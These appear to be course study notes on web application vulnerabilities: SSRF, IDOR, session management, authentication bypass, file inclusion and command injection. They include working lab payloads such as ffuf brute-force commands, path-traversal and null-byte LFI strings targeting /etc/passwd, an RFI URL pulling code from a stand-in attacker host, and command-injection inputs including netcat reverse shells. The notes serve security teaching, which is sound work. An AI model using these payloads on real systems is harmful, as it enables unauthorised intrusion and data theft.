**Step 4 — bypass the deny list with traversal.** Change the radio button `value` to:

```
x/../private
```

|Stage|Path|Explanation|
|---|---|---|
|Input validation|`x/../private`|Deny list checks the raw string — doesn't literally start with `/private`, so it **passes**|
|Path normalisation|`/private`|Web server resolves the traversal: enters `x`, `../` climbs back up — lands on `/private`|

The validation layer and the web server interpret the path at **different stages** — validation runs before normalisation, so the traversal sequence sails through the check and only resolves to the forbidden path afterward, on the server's own filesystem/routing logic. Select the modified radio button, **Update Avatar** — succeeds this time.

**Step 5 — extract the flag.** View page source: the `<img>` tag now contains Base64 data representing `/private`'s actual contents.

```bash
echo "PASTE_BASE64_STRING_HERE" | base64 -d
```

Decoded output contains the flag.

> [!summary] Quick Recap — SSRF Practice
> 
> - Hidden `value` attribute on a radio button was the actual injection point — invisible without viewing page source
> - The Base64 data-URI rendering behaviour is the tell: confirms the server fetches-and-embeds arbitrary resource content, not just image files
> - `x/../private` bypasses a raw-string deny list precisely because validation happens **before** path normalisation — the same validation-vs-normalisation timing gap that makes traversal attacks work everywhere else
> - `base64 -d` to decode the exfiltrated content is the final, simple step once the fetch itself succeeds

---

> [!summary] Full SSRF Room — One Glance
> 
> - Regular SSRF = readable response; Blind SSRF = confirmed via callback (Collaborator/logger), timing, or error-message differences
> - Four recognition patterns: full URL param, partial URL (hostname/path only), path traversal in a URL param, hidden form field
> - Deny lists fall to alternate IP representations and DNS-based tricks (`nip.io`, attacker DNS → internal IP)
> - Allow lists fall to subdomain matching and `user@host` URL credential-syntax abuse — both exploit string-prefix checks instead of real parsing
> - Open redirects on the trusted domain itself chain past allow lists entirely — feature interactions, not just individual features, need scrutiny
> - Cloud metadata (`169.254.169.254`) remains the single highest-impact target whenever SSRF reaches it
### IDOR

**What is an IDOR?** — Insecure Direct Object Reference, a type of access control vulnerability. Occurs when a web server receives user-supplied input to retrieve objects (files, data, documents), places too much trust in that input, and doesn't validate server-side that the requested object belongs to the requesting user.

**An IDOR Example** — after signing up for an online service, changing your profile info goes to `http://online-service.thm/profile?user_id=1305`, showing your info. Changing `user_id` to `1000` (`http://online-service.thm/profile?user_id=1000`) shows someone else's information — an IDOR vulnerability.

**Finding IDORs in Encoded IDs** — when passing data page to page (post data, query strings, cookies), developers often encode raw data first so the receiving server can understand it. Encoding turns binary data into ASCII strings, commonly `a-z, A-Z, 0-9` and `=` for padding. Base64 is the most common web encoding and usually easy to spot. Decode with a site like https://www.base64decode.org/, edit the data, re-encode with https://www.base64encode.org/, and resubmit to see if the response changes.

**Finding IDORs in Hashed IDs** — hashed IDs are more complicated but may follow a predictable pattern, such as being the hashed version of an integer. E.g. the ID `123` becomes `202cb962ac59075b964b07152d234b70` under MD5. Worth putting discovered hashes through https://crackstation.net/ to check for matches.

**Finding IDORs in Unpredictable IDs** — if the ID can't be detected via the above methods, an excellent detection method is creating two accounts and swapping the ID numbers between them. If you can view the other user's content using their ID while logged in as a different account (or not logged in at all), you've found a valid IDOR.

**Where are IDORs located?** — the vulnerable endpoint isn't always visible in the address bar. It could be content loaded via an AJAX request, or referenced in a JavaScript file. Sometimes endpoints have an unreferenced parameter left over from development that made it to production. For example, a call to `/user/details` might display your own info (authenticated via session), but through **parameter mining** you discover a `user_id` parameter you can use to display other users' information: `/user/details?user_id=123`.

## 9. Web Application Vulnerabilities II

> [!info] Section overview Six rooms: Session Management, Broken Authentication, File Inclusion, Command Injection, API Pentesting, Support CTF.
### Session Management

#### Intro

After authentication, a web application doesn't ask for your username and password on every request — instead, it issues you a **session**, used to keep state, track your actions, and decide what you're allowed to do. Session management covers doing this correctly; done poorly, a threat actor can compromise and hijack a session.

**Prerequisites:**

- Introduction to Web Hacking
- Enumeration & Brute Forcing

**Learning Objectives:**

- Understand what Session Management is
- Understand the differences between authentication and authorisation and how they each play a role in session management
- Learn about the two main session management methods
- Learn about the session management lifecycle
- Learn how to practically exploit vulnerable session management implementations

#### What is Session Management

HTTP is inherently **stateless**, so sessions are used to track users throughout their use of a web application. Session management is the process of managing these sessions and keeping them secure.

**Session Management Lifecycle:**

1. **Session Creation** — Often happens the moment you visit an app, even before login, since some apps want to track pre-auth actions too. Once you provide credentials, you receive a session value sent with each new request. How this value is generated, used, and stored is critical to security.
2. **Session Tracking** — The session value is submitted with every request; the server performs a lookup to determine who it belongs to and what permissions apply. Issues here can let a threat actor hijack a session or impersonate one.
3. **Session Expiry** — Since HTTP is stateless, the server has no way of knowing when you just walk away (e.g. closing the tab). The session value needs a lifetime — an expired value submitted later should be rejected and redirect to login.
4. **Session Termination** — When a user explicitly logs out, the server must terminate the session. Unlike expiry, this happens regardless of remaining lifetime. Issues here can let a threat actor retain persistent access to an account.

#### Authentication and Authorisation

The **IAAA model**:

- **Identification** — Claiming who you are, typically via username or email.
- **Authentication** — Proving you are who you claim, e.g. via password. On success, session creation kicks in.
- **Authorisation** — Verifying the authenticated user has rights to perform the requested action. Session tracking is critical here.
- **Accountability** — Logging user actions so an incident can be pieced together after the fact.

**IAAA and Session Management:** Authentication drives session creation; authorisation is verified via session tracking on each request; accountability requires that requests and their associated sessions are logged.

#### Cookies Vs. Tokens

**Cookie-Based Session Management** — The "old-school" approach. The server sends a `Set-Cookie` header, e.g.:

```
Set-Cookie: session=12345;
```

The browser stores this automatically for the issuing domain and decides when to send it. Notable attributes:

- **Secure** — Cookie only transmitted over verified HTTPS; blocked on cert errors or plain HTTP.
- **HTTPOnly** — Cookie value can't be read by client-side JavaScript.
- **Expire** — When the cookie should be removed/invalidated.
- **SameSite** — Controls whether the cookie is sent on cross-site requests, helping prevent CSRF.

**Token-Based Session Management** — Newer approach. After authentication, the token is returned in the response body, and client-side JS stores it (commonly in **LocalStorage**). On each request, JS must load the token and attach it as a header — commonly a **JWT** sent via `Authorization: Bearer`. Since the browser's built-in cookie handling isn't used, there's no enforced standard — implementation is "the wild west."

**Benefits and Drawbacks:**

|Cookie-Based Session Management|Token-Based Session Management|
|---|---|
|Sent automatically by the browser with each request|Must be manually attached as a header via client-side JS|
|Cookie attributes (Secure, HTTPOnly, SameSite) enhance browser-level protection|No automatic security protections — must be safeguarded against disclosure|
|Vulnerable to conventional client-side attacks like CSRF (browser tricked into making a request on your behalf)|Not automatically attached and can't be read cross-domain from LocalStorage, so conventional CSRF is blocked|
|Locked to a specific domain — awkward for decentralised apps|Works well for decentralised apps; managed via JS and can self-contain verification info|

#### Securing the Session Lifecycle

**Session Creation** — the most vulnerability-prone phase:

- **Weak Session Values** — Rare with modern frameworks, but custom/AI-generated implementations can reintroduce this (e.g. base64-encoding the username as the session value). If reverse-engineered, an attacker can guess or forge valid session values.
- **Controllable Session Values** — For self-describing tokens like JWTs, failing to verify the signature (or generating it insecurely) lets an attacker forge their own valid token.
- **Session Fixation** — If a pre-auth session value isn't rotated on login, an attacker who captured that value while you were unauthenticated can gain access once you log in on it.
- **Insecure Session Transmission** — Common in SSO setups where auth and app servers are separate; session material passes through the browser. Insecure redirects (attacker-controlled post-auth redirect URL) can expose session material — Oracle's SSO solution had a real-world bug of this type.

**Session Tracking** — the second-largest source of vulnerabilities:

- **Authorisation Bypass** — Insufficient checks on whether a user may perform a requested action.
    - **Vertical bypass** — Performing an action reserved for a more privileged user.
    - **Horizontal bypass** — Performing an allowed action, but on someone else's data. Harder to defend against than vertical bypass since it requires explicit code checking the requester's identity against the specific data/resource requested.
- **Insufficient Logging** — Without logging which session performed which action (and tying sessions back to users), incident investigations have unfillable gaps. Both accepted _and_ rejected actions must be logged — a hijacked session's actions look legitimate, so logging only rejections misses the picture.

**Session Expiry** — main issue is **excessive expiry times**. Session lifetime should fit the application's risk profile (a banking app needs a much shorter lifetime than webmail). Long-lived sessions should also attest to usage location — a location change (possible hijack indicator) should trigger termination.

**Session Termination** — main issue is sessions not being invalidated **server-side** on logout. Without server-side invalidation, a hijacked session can't be revoked even once the legitimate user notices. For tokens with self-contained lifetimes, a **blocklist** can be used to reject terminated tokens. Best practice: let users view/terminate all their active sessions, and terminate all sessions on a successful password reset.

#### Exploiting Insecure Session Management

**Enumeration methodology** — map out the session lifecycle before attacking it:

1. Visit the unauthenticated app — no cookies/tokens present initially suggests unauthenticated sessions aren't tracked.
2. Check sign-up options — e.g. Student (open) vs. Lecturer (needs a verification code) — an open signup lets you kick off the lifecycle immediately.
3. Log in while monitoring network traffic — reveals session mechanism (cookie vs. token) and cookie attributes (e.g. `HTTPOnly` set, blocking JS-based theft).
4. Browse authenticated functionality while watching which values are sent — confirms whether tracking happens via cookie, and note oddities like a `Set-Cookie` reissuing the _same_ value to extend a session's lifetime (persistent cookie behavior).
5. Remove the cookie and re-request a protected page — if the request still partially succeeds but with reduced data, unauthenticated/partial access exists and needs further mapping.
6. Test logout — confirm the cookie is cleared client-side, then replay the _old_ session value. A **500 Internal Server Error** on an invalidated session is itself a finding — an invalid session should be cleanly rejected, not throw a server error.
7. Inspect LocalStorage for additional token/state data (e.g. a token cache with `userRole`, `id`, `username` fields). Try tampering with role values (e.g. `student` → `lecturer`, or numeric role IDs) to probe for client-side-trusted authorization data.

**Example mapped lifecycle from this room:**

|Lifecycle Phase|Observation|
|---|---|
|Session Creation|Combination of cookie- and token-based session management used|
|Session Creation|New session value issued per login attempt|
|Session Creation|Session value appears sufficiently random|
|Session Tracking|Unauthenticated actions are not tracked via a session|
|Session Tracking|Cookie sent with each request for tracking|
|Session Tracking|Several requests succeed even without a cookie|
|Session Tracking|Initial post-auth token values dictate visible information|
|Session Expiry|Mismatch between client-side and server-side expiry times|
|Session Expiry|Expiry time is excessively long|
|Session Termination|Users can forcibly terminate their session|
|Session Termination|Sessions terminated server-side, but reusing an old session causes an internal server error|

**Reportable now:** Excessive Session Lifetimes. **Needs further investigation:** Access controls on all API endpoints; web application logs for accountability of actions.

**Goal:** using the mapped lifecycle and the client-side role/ID tampering angle (LocalStorage token cache), attempt to escalate from student access to lecturer-level information.

> [!summary] Quick Recap — Session Management
> 
> - Sessions exist because HTTP is stateless; lifecycle = **Creation → Tracking → Expiry → Termination**
> - IAAA: **I**dentification (claim) → **A**uthentication (prove) → **A**uthorisation (permission check) → **A**ccountability (logging)
> - **Cookies**: browser-managed, `Secure`/`HTTPOnly`/`Expire`/`SameSite` attributes, vulnerable to CSRF
> - **Tokens** (e.g. JWT): JS-managed via LocalStorage + `Authorization: Bearer`, no built-in protections, resistant to CSRF but exposed to XSS/theft
> - Weak/guessable session values, unrotated pre-auth sessions (**fixation**), and insecure SSO redirects all break session **creation**
> - **Horizontal** authorisation bypass (same permission, wrong data) is harder to catch than **vertical** (wrong permission level) — needs explicit ownership checks in code
> - Log both accepted _and_ rejected actions — hijacked-session activity looks "accepted"
> - Excessive session lifetime + no location-based re-validation = long-lived hijack risk
> - Session termination must be enforced **server-side**; an invalid/old session should return a clean auth error, not a 500
> - Practical recon: diff behavior with/without cookie, replay old cookies post-logout, and inspect LocalStorage for tamperable role/ID fields

### Authentication Bypass

**Brief** — different ways website authentication methods can be bypassed, defeated, or broken. These vulnerabilities can be some of the most critical, often ending in leaks of customers' personal data.

**Username Enumeration** — a helpful exercise for finding auth vulnerabilities: build a list of valid usernames. Website error messages are a great resource. E.g. on a "create account" form, entering username **admin** with fake info elsewhere returns "**An account with this username already exists**." Use that error's existence to build a list of valid usernames with ffuf:
```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.113.136.196/customers/signup -mr "username already exists"
```
- `-w` — location of the username wordlist
- `-X` — request method (GET by default, POST here)
- `-d` — data to send (username set to `FUZZ`, the ffuf placeholder for wordlist values)
- `-H` — additional headers, here setting `Content-Type` so the server knows it's form data
- `-u` — target URL
- `-mr` — text on the page confirming a match (a valid username)

**Brute Force** — using the `valid_usernames.txt` generated above, attempt a brute force attack on the login page. A brute force attack is an automated process trying a list of common passwords against a single username, or (as here) a list of usernames:
```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.113.136.196/customers/login -fc 200
```
Different from before: since we're using multiple wordlists, we specify our own FUZZ keywords — `W1` for usernames, `W2` for passwords — separated by a comma after `-w`. For a positive match, `-fc` filters for an HTTP status code other than 200.

**Logic Flaw:**
- **What is a Logic Flaw?** — sometimes authentication processes contain logic flaws, where the typical logical path of an application is bypassed, circumvented, or manipulated. Can exist in any area of a website.
- **Example:**
  ```
  if( url.substr(0,6) === '/admin') {
      # Code to check user is an admin
  } else {
      # View Page
  }
  ```
  Because this uses `===` (three equals, exact match including letter casing), an unauthenticated user requesting `/adMin` won't have their privileges checked and will see the page — totally bypassing the auth check.
- **Practical:** examining the Reset Password function (`http://10.113.136.196/customers/reset`). Entering an invalid email gives "**Account not found from supplied email address**." Using a valid email (`robert@acmeitsupport.thm`) advances to a step asking for the username; entering `robert` and pressing Check Username confirms a reset email will be sent.

  The vulnerability: in the second step, the username is submitted in a POST field, but the email address is sent in the query string as a GET field:
  ```
  curl 'http://10.113.136.196/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
  ```
  (`-H` adds the `Content-Type` header so the server understands it's form data.)

  PHP's `$_REQUEST` variable contains data from both the query string and POST data. If the same key name appears in both, the application logic favours the POST field over the query string. So if we add another parameter to the POST form (an `email` field), we can control where the password reset email actually gets delivered.

**Broken Authentication — Cookies, Hashing, Encoding:**
- **Cookies** — some cookies are plaintext and obviously functional. E.g. after a successful login:
  ```
  Set-Cookie: logged_in=true; Max-Age=3600; Path=/
  Set-Cookie: admin=false; Max-Age=3600; Path=/
  ```
  `logged_in` controls whether the user is logged in; `admin` controls admin privileges. If we can change cookie contents on a request, we can change our privileges.
  ```
  curl http://10.113.136.196/cookie-test
  # → Not Logged In

  curl -H "Cookie: logged_in=true; admin=false" http://10.113.136.196/cookie-test
  # → Logged In As A User

  curl -H "Cookie: logged_in=true; admin=true" http://10.113.136.196/cookie-test
  # → (admin access)
  ```
- **Hashing** — sometimes cookie values look like random strings; these are hashes, an irreversible representation of the original text. Examples of the string "1" hashed:
  - MD5: `c4ca4238a0b923820dcc509a6f75849b`
  - SHA256: `6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b`
  - SHA512: `4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a`
  - SHA1: `356a192b7913b04c54574d18c28d46e6395428ab`

  The same input always produces the same hash output, which is helpful for us — services like https://crackstation.net/ keep databases of billions of hashes and their original strings.
- **Encoding** — similar to hashing (produces what looks like random text), but reversible. Allows converting binary data into human-readable text that's safe to transmit over mediums that only support plain ASCII. Common types: base32 (characters A-Z and 2-7) and base64 (a-z, A-Z, 0-9, +, /, and `=` for padding).


### File Inclusion

**Intro** — this room covers the essential knowledge to exploit file inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal, plus the risk of these vulnerabilities and required remediation.

**Why do File Inclusion vulnerabilities happen?** — commonly found/exploited in poorly written and implemented web applications across various languages (e.g. PHP). The main issue is input validation — user inputs aren't sanitized or validated, and the user controls them, causing the vulnerability.

**What is the risk?** — by default, an attacker can leak data such as code, credentials, or other important files related to the web app or OS. Moreover, if the attacker can write files to the server by any other means, file inclusion might be used alongside that to gain remote command execution (RCE).

**Path Traversal** — also known as Directory Traversal, a vulnerability allowing an attacker to read OS resources (local files on the server) by manipulating and abusing the web app's URL to locate/access files or directories stored outside the application's root directory. Test the URL parameter with payloads to see how the app behaves — the "dot-dot-slash attack" moves up a directory using `../`. If the attacker finds an entry point like `get.php?file=`, they can send: `http://webapp.thm/get.php?file=../../../../etc/passwd`.

Developers sometimes add filters to limit access to certain files/directories. Common OS files worth testing:
| File | Purpose |
|---|---|
| `/etc/issue` | Message/system ID printed before login prompt |
| `/etc/profile` | System-wide default variables (export vars, umask, terminal types, mail messages) |
| `/proc/version` | Linux kernel version |
| `/etc/passwd` | All registered users with access to the system |
| `/etc/shadow` | System users' password info |
| `/root/.bash_history` | Command history for the `root` user |
| `/var/log/dmessage` | Global system messages, including boot-time logs |
| `/var/mail/root` | All emails for the `root` user |
| `/root/.ssh/id_rsa` | Private SSH keys for root or another known valid user |
| `/var/log/apache2/access.log` | Accessed requests for the Apache web server |
| `C:\boot.ini` | Boot options for BIOS-firmware Windows computers |

**Local File Inclusion (LFI)** — often due to a developer's lack of security awareness. In PHP, functions like `include`, `require`, `include_once`, `require_once` often contribute to vulnerable applications. Walking through various LFI scenarios:

**#1** — a web app offers two languages, EN and AR, selected by the user:
```php
<?PHP
    include($_GET["lang"]);
?>
```
The GET parameter `lang` is used directly to include the page file: `http://webapp.thm/index.php?lang=EN.php` loads the English page, `lang=AR.php` loads Arabic — where `EN.php`/`AR.php` exist in the same directory. Theoretically, with no input validation, we can access and display any readable file on the server: `http://webapp.thm/get.php?file=/etc/passwd`

**#2** — the developer specifies the directory inside the function:
```php
<?PHP
    include("languages/". $_GET['lang']);
?>
```
This restricts `include` to calling PHP pages inside the `languages` directory only, via the `lang` parameter. With no input validation, an attacker can manipulate the URL to replace `lang` with OS-sensitive files, using the same path traversal trick, since `include` will still include any called file into the current page:
```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```

**#3** — black box testing (no source code access), so errors matter for understanding how data is passed/processed. Entry point: `http://webapp.thm/index.php?lang=EN`. Entering invalid input like `THM` produces:
```
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line
```
This discloses that the function looks like `include(languages/THM.php);` — files in the `languages` directory get `.php` appended automatically. Valid input: `index.php?lang=EN` (file `EN.php` inside `languages`). The error also disclosed the full web app directory path: `/var/www/html/THM-4/`.

To exploit, use the `../` trick from directory traversal:
```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```
4 `../` were used because the path has four levels (`/var/www/html/THM-4`). But this still errors:
```
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line
```
We moved out of the PHP directory, but `include` still appends `.php` to the input — the developer specifies the file type passed to `include`. Bypass with a **NULL BYTE**, `%00` — a URL-encoded technique (or `0x00` in hex) used with user-supplied data to terminate the string, tricking the web app into disregarding anything after the null byte:
```
include("languages/../../../../../etc/passwd%00").".php");
```
which is equivalent to:
```
include("languages/../../../../../etc/passwd");
```
**Note:** the `%00` trick is fixed and doesn't work on PHP 5.3.4 and above.

**#4** — the developer filters keywords to avoid disclosing sensitive information; `/etc/passwd` gets filtered. Two possible bypasses: the NullByte `%00`, or the current-directory trick appended to the filtered keyword (`/..`):
```
http://webapp.thm/index.php?lang=/etc/passwd/
http://webapp.thm/index.php?lang=/etc/passwd%00
```
To make this clearer using filesystem logic: `cd ..` moves back one step, `cd .` stays in the current directory. So `/etc/passwd/..` resolves to `/etc/` (moved one level up), while `/etc/passwd/.` resolves to `/etc/passwd` (dot = stay put).

**#5** — the developer filters some keywords. Payload:
```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```
produces:
```
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line
```
From `include(languages/etc/passwd)`, we know the app replaces `../` with an empty string. Bypass by sending:
```
....//....//....//....//....//etc/passwd
```
This works because the PHP filter only matches and replaces the *first* `../` substring it finds, and doesn't do another pass — leaving a valid `../` behind after the first removal.

**#6** — the developer forces `include` to read from a defined directory, e.g. requiring input like `http://webapp.thm/index.php?lang=languages/EN.php`. To exploit, include the directory in the payload:
```
?lang=languages/../../../../../etc/passwd
```

**Remote File Inclusion (RFI)** — a technique to include remote files into a vulnerable application. Like LFI, occurs when user input isn't properly sanitized, allowing injection of an external URL into an `include` function. Requires the `allow_url_fopen` option to be on.

The risk of RFI is higher than LFI, since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences:
- Sensitive Information Disclosure
- Cross-site Scripting (XSS)
- Denial of Service (DoS)

The attacker injects a malicious URL pointing to their own server: `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`. With no input validation, the malicious URL passes into `include`. The web app server sends a GET request to the malicious server to fetch the file, then includes the remote file, executing the PHP file within the page and sending the execution content back to the attacker.

> [!summary] Quick Recap — CTF Techniques
> - Subdomains: crt.sh (certs) + dnsrecon/sublist3r (brute) + vhost fuzzing on the `Host` header, filtered by `-fs`
> - Auth bypass patterns: username enum via error messages, `===` logic flaws, GET/POST param confusion (`$_REQUEST` favors POST), plaintext cookie edits
> - IDOR = change an ID you control and see what you shouldn't get back — check encoded (base64) and hashed (crackstation) IDs too
> - LFI escalation ladder: raw path → traversal → null byte (`%00`, pre-5.3.4 only) → dot-trick (`/etc/passwd/.`) → double `../` (non-recursive filter bypass) → forced directory prefix
> - RFI > LFI in severity because it can hand you RCE directly — needs `allow_url_fopen` on

---

### Command Injection

#### Intro

Web applications frequently execute commands on the underlying operating system as part of their normal functionality. When user input is passed into a system command without proper checks, an attacker can inject additional commands alongside the legitimate ones — this is **command injection**, allowing arbitrary OS-level commands to be executed through a vulnerable application.

Injected commands run with the **same privileges as the application itself**. If a web server runs as `joe`, every injected command executes as `joe` and inherits its permissions. If the application runs elevated, the impact scales accordingly.

**Command Injection vs. RCE** — "Remote Code Execution" (RCE) is the broader outcome of gaining the ability to execute code on a remote system. Command injection is one specific technique for achieving RCE; others include insecure deserialization or memory corruption.

**Classification** — In OWASP Top 10:2025 this falls under **A05: Injection**. OS command injection specifically maps to **CWE-78** (Improper Neutralization of Special Elements used in an OS Command). Despite dropping a couple of positions in recent editions, it remains one of the most widely tested and exploited vulnerability classes.

**Prerequisites:** Basic Linux commands and shell operators (Linux Fundamentals module). Basic familiarity with how web apps handle user input (Web Fundamentals path) — code examples use PHP and Python but deep language proficiency isn't required.

**Learning Objectives:**

- Explain what command injection is and why it poses a critical risk to applications
- Understand how unsafe use of system calls in application code introduces this vulnerability
- Distinguish between blind and verbose command injection and know how to detect each
- Exploit command injection using shell operators and common payloads on both Linux and Windows
- Apply remediation techniques such as input sanitisation and the use of safe APIs
- Perform command injection against a live target to retrieve sensitive data

#### Discovering Command Injection

Command injection exists because many languages provide built-in functions that let application code execute commands directly on the OS: PHP has `exec()`, `system()`, `shell_exec()`, `passthru()`; Python has the `subprocess` module; Node.js has `child_process.exec()`. These functions aren't dangerous by themselves — they become a serious problem when **user-supplied input is passed into them without validation or sanitisation**.

**A PHP Example:**

```php
<?php
$songs = "/var/www/html/songs";                                    // 1

if (isset($_GET["title"])) {
    $title = $_GET["title"];                                       // 2

    $command = "grep $title /var/www/html/songtitle.txt";          // 3

    $search = exec($command);                                      // 4
    if ($search == "") {
        $return = "<p>The requested song</p><p> $title does </p><b>not</b><p> exist!</p>";
    } else {
        $return = "<p>The requested song</p><p> $title does </p><b>exist!</b>";
    }

    echo $return;
}
?>
```

1. `$songs` defines the directory where MP3 files are stored.
2. User input is pulled from the URL query string via `$_GET` into `$title`.
3. That variable is concatenated **directly** into a `grep` command with no sanitisation or validation.
4. The command runs via `exec()`, and the result determines the response shown to the user.

A normal search `?title=Yesterday` produces `grep Yesterday /var/www/html/songtitle.txt` — harmless. An attacker submitting `?title=; cat /etc/passwd` instead produces:

```bash
grep ; cat /etc/passwd /var/www/html/songtitle.txt
```

The shell treats the semicolon as a command separator: `grep` runs with no meaningful arguments and fails silently, then `cat /etc/passwd /var/www/html/songtitle.txt` runs, dumping the sensitive `/etc/passwd` file. **Root cause:** user input trusted and concatenated directly into a shell command with nothing validating or sanitising it in between.

> This kind of data would normally live in a database rather than be `grep`'d off disk — it's an illustrative example. The pattern that matters: **user input flows into a system call with no validation in between.**

**A Python Example** (Flask):

```python
import subprocess
from flask import Flask                                            # 1
app = Flask(__name__)

def execute_command(shell):                                        # 2
    return subprocess.Popen(shell, shell=True, stdout=subprocess.PIPE).stdout.read()

@app.route('/<shell>')                                             # 3
def command_server(shell):
    return execute_command(shell)
```

1. Flask sets up the web server.
2. `execute_command` uses `subprocess` to run whatever string it's given as a system command.
3. A route hands whatever appears in the URL path directly to that function for execution — visiting `http://flaskapp.thm/whoami` runs `whoami` on the server.

An extreme example (the app is basically a web-based terminal), but it demonstrates the core principle: **regardless of language or framework**, if user input reaches a system call without proper checks, command injection is possible.

#### Exploiting Command Injection

Applications that build system commands from user input can often be manipulated via **shell operators** — `;`, `&`, `&&` — which chain multiple commands together for execution. Command injection is detected in one of two ways:

**Verbose command injection** — the application displays the injected command's output directly in its response (e.g. injecting `; whoami` shows the running username on the page). Easier to work with since results are immediately visible.

**Blind command injection** — the command still executes server-side, but no output is returned to the page; the response looks identical whether injection succeeded or failed. Requires indirect signals to confirm execution.

**Detecting Blind Command Injection:**

- **Time delays** — `ping` and `sleep` are useful. Injecting `; ping -c 10 127.0.0.1` should add roughly 10 seconds to the response time. A response time that scales with the ping count is a strong indicator of success.
- **Output redirection to a file** — inject `; whoami > /var/www/html/output.txt`, then browse to `http://target.thm/output.txt` to read the result. Uses shell redirection operators (`>`).
- **`curl` for crafting/sending requests** with the payload embedded in the URL, e.g. appending `; whoami` to a `search` parameter:

```bash
curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
```

- Syntax for commands differs between Linux and Windows — expect to experiment with several approaches.

**Detecting Verbose Command Injection** — more straightforward, since output is returned directly. Injecting `; whoami` into something like a `ping` utility field might display the username right below the ping results. `ping` and `whoami` are good starting points since their output is immediately recognisable.

**Useful Payloads — Linux:**

|Payload|Description|
|---|---|
|`whoami`|Displays what user the application is running as.|
|`ls`|Lists current directory contents — config files, env files with tokens/API keys, and other sensitive data may be present.|
|`ping`|Causes the application to hang for a measurable period; useful for confirming blind injection.|
|`sleep`|Alternative time-based payload for blind injection, useful when `ping` isn't installed.|
|`nc`|Netcat can spawn a reverse shell on the vulnerable application, giving an interactive foothold for privesc exploration.|

**Useful Payloads — Windows:**

|Payload|Description|
|---|---|
|`whoami`|Displays what user the application is running as.|
|`dir`|Lists current directory contents — config files, env files with tokens/API keys, and other sensitive data may be present.|
|`ping`|Causes the application to hang for a measurable period; useful for confirming blind injection.|
|`timeout`|Alternative time-based payload for blind injection, useful when `ping` isn't installed.|

#### Remediation

Prevention ranges from avoiding dangerous functions entirely to carefully filtering/validating user input before it reaches a system call. Examples use PHP, but the principles apply across virtually every language.

**Vulnerable Functions** — PHP's `exec()`, `passthru()`, `system()` execute whatever string/user data they're given on the underlying system. Any application using these without proper checks is vulnerable.

**Client-side restriction (first line of defence, not sufficient alone):**

```html
<input type="text" id="ping" name="ping" pattern="[0-9]+">    <!-- 1 -->
```

```php
<?php
echo passthru("/bin/ping -c 4 " . $_GET["ping"]);             // 2
?>
```

1. The HTML `pattern="[0-9]+"` restricts the form to digits only.
2. The `ping` parameter value is passed straight to `passthru()`.

Because the field only accepts numerals, injecting `whoami` or operators like `;` would be rejected before the request is even sent. **But** client-side validation (HTML patterns) can be bypassed by anyone sending requests directly (`curl`, Burp Suite) — **server-side validation is essential.**

**Input Sanitisation (server-side)** — specify exactly what formats/types of data are allowed and reject everything else (e.g. numeric-only fields, stripping special characters like `>`, `&`, `/`). Example using `filter_input`:

```php
<?php

if (!filter_input(INPUT_GET, "number", FILTER_VALIDATE_NUMBER)) {

}
```

This ensures the server rejects anything not matching the expected format, even if client-side controls are bypassed. PHP's `filter_input()` docs cover additional filters depending on expected data type.

**Bypassing Filters** — filters aren't bulletproof; attackers can abuse underlying application logic to get around them. Example: if an app strips quotation marks/certain characters, an attacker can represent the same string via **hex encoding**:

```php
$payload = "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
```

This decodes to `/etc/passwd`. The filter sees hex values and lets them through, while the OS interprets and acts on the decoded path — the data arrives in a format the filter doesn't recognise as dangerous but the system still executes correctly.

**Takeaway:** No single layer is guaranteed to catch everything. **Defence in depth** — combining input validation, sanitisation, allowlisting, and least privilege — gives the best chance of preventing command injection even if one layer is bypassed.

> [!summary] Quick Recap — Command Injection
> 
> - Occurs when user input reaches a system-execution function (`exec()`, `system()`, `passthru()`, `subprocess`, `child_process.exec()`, etc.) without validation/sanitisation
> - Injected commands inherit the **application's own privileges** — command injection ≠ RCE, but is one technique for achieving it (OWASP A05 / CWE-78)
> - **Verbose** injection = output shown in response (easy to spot); **Blind** injection = no output, detect via **time delays** (`ping -c N`, `sleep`) or **file redirection** (`> output.txt` then browse to it)
> - Chain payloads with shell operators: `;`, `&`, `&&`
> - Linux recon payloads: `whoami`, `ls`, `ping`, `sleep`, `nc` (reverse shell) — Windows: `whoami`, `dir`, `ping`, `timeout`
> - Remediation: avoid dangerous exec functions where possible; **client-side validation (HTML `pattern`) is not enough** — always validate/sanitise server-side (e.g. `filter_input` + `FILTER_VALIDATE_NUMBER`)
> - Filters can be bypassed via encoding tricks (e.g. hex-encoded paths) — use **defence in depth**, not a single control
### API Pentesting

#### Intro

An **API** (Application Programming Interface) is a structured interface that lets software components communicate. Logging into a banking app, scrolling a social feed, or placing a delivery order all trigger API calls to a back-end server to fetch data, submit information, and trigger actions. Rather than full HTML pages, APIs typically exchange lightweight **JSON** — this efficiency and flexibility is why APIs are the backbone of modern application architecture.

In API-driven architectures, the back-end exposes endpoints that any client can call independently — a single API may serve a web app, a mobile app, and third-party integrations simultaneously. This makes the **API itself a critical attack surface**: if it's vulnerable, every dependent client is affected.

